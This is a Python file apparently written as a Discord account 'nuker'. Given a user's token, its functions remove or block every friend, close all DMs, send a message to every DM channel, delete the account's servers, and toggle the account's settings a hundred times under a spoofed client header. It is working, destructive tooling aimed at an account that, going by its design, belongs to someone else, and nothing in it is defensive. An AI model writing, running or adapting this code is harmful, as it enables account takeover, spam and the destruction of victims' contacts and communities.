import requests
import random


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]

    return text

def mainHeader(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }

# work
def remove_friends(token):
    validityTest = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if validityTest.status_code != 200:
        holder = "❌ Invalid token."
        return holder
    headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
    rmvfr = requests.get(
        "https://discord.com/api/v9/users/@me/relationships", headers=headers
    ).json()
    try:
        for i in rmvfr:
            requests.delete(
                f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                headers=headers,
            )
    except:
        pass
    holder = "✅ Sucessfuly removed all friends."
    return holder
            
# work
def block_friends(token):
    validityTest = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if validityTest.status_code != 200:
        holder = "❌ Invalid token."
        return holder
    headers = {"authorization": token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    blck = requests.get(
        "https://discord.com/api/v9/users/@me/relationships", headers=headers
    ).json()
    try:
        for i in blck:
            requests.put(
                f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                headers=headers,
                json=json,
            )
    except:
        pass
    holder = "✅ Sucessfuly blocked all friends."
    return holder

            



# work
def settings(token):
    validityTest = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if validityTest.status_code != 200:
        holder = "❌ Invalid token."
        return holder
    for i in range(0, 100):
        headers = mainHeader(token)
        changset = True
        payload = {"theme": "light", "developer_mode": changset, "afk_timeout": 60, "locale": "ko",
                    "message_display_compact": changset, "explicit_content_filter": 2,
                    "default_guilds_restricted": changset,
                    "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                            "mutual_guilds": changset},
                    "inline_embed_media": changset, "inline_attachment_media": changset,
                    "gif_auto_play": changset, "render_embeds": changset,
                    "render_reactions": changset, "animate_emoji": changset,
                    "convert_emoticons": changset, "animate_stickers": 1,
                    "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                    "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                    "stream_notifications_enabled": changset, "status": "idle",
                    "detect_platform_accounts": changset, "disable_games_tab": changset}
        requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
        changset = False
        payload = {"theme": "dark", "developer_mode": changset, "afk_timeout": 120, "locale": "bg",
                    "message_display_compact": changset, "explicit_content_filter": 0,
                    "default_guilds_restricted": changset,
                    "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                            "mutual_guilds": changset},
                    "inline_embed_media": changset, "inline_attachment_media": changset,
                    "gif_auto_play": changset, "render_embeds": changset,
                    "render_reactions": changset, "animate_emoji": changset,
                    "convert_emoticons": changset, "animate_stickers": 2,
                    "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                    "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                    "stream_notifications_enabled": changset, "status": "dnd",
                    "detect_platform_accounts": changset, "disable_games_tab": changset}
        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)




# work
def dms_close(token):
    validityTest = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if validityTest.status_code != 200:
        holder = "❌ Invalid token."
        return holder
    headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
    clsdms = requests.get(
        "https://discord.com/api/v9/users/@me/channels", headers=headers
    ).json()
    try:
        for channel in clsdms:
            requests.delete(
                f"https://discord.com/api/v9/channels/{channel['id']}",
                headers=headers,
            )
    except:
        pass
    holder = "✅ Sucessfuly closed all DMs."
    return holder

# work
def mass_dm(token, msg):
    validityTest = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if validityTest.status_code != 200:
        holder = "❌ Invalid token."
        return holder
    headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
    reqmas = requests.get(
        "https://discord.com/api/v9/users/@me/channels", headers=headers
    ).json()
    try:
        for chen in reqmas:
            json = {"content": msg}
            requests.post(
                f"https://discord.com/api/v9/channels/{chen['id']}/messages",
                headers=headers,
                data=json,
            )
    except:
        pass
    holder = "✅ Sucessfuly DMed everyone"
    return holder
        
    
# working
def delete_servers(token):
    validityTest = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if validityTest.status_code != 200:
        holder = "❌ Invalid token."
        return holder
    headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
    dmms = requests.get(
        "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    try:
        for i in dmms:
            requests.post(
                f"https://discord.com/api/v9/guilds/{i['id']}/delete",
                headers=headers,
            )
    except:
        pass
    holder = "✅ Sucessfuly deleted all servers"
    return holder
